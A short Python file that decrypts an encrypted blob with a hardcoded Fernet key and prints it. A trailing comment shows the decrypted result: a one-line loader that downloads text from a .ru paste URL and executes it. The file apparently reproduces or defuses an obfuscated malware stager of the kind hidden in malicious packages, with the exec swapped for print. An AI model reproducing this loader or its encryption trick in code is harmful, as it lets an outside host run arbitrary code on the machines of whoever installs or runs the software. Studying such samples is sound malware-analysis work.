from fernet import Fernet
import requests

print(Fernet(b'Ar3Pygm1rmWhrkdmgBZ6AZFtiTI7_fyxoxhG4nrjToY=').decrypt(b'gAAAAABm1zaTFxQgMwBm_LfjTVeJd6eLgEK62vy2nHiVUJpz61BVpfwLBGpZ5xOt7FjSrb0NiUWW8hvfqD_6w7Lx2K_CrHdAoWwaiZon5ljWQKoX7M86rJyxCoKX-sYhG2VX4iyYLvEH8wi3OQ20fMHsXi-p0awTKmvM0utccteRyv2DHkpOqeoH8Q-r1jEow_o10nur9BqpdZnaUfGfUDkzSnUbrzwJqw=='))


# b"exec(requests.get('https://1312services.ru/paste?userid=4').text.replace('<pre>','').replace('</pre>',''))"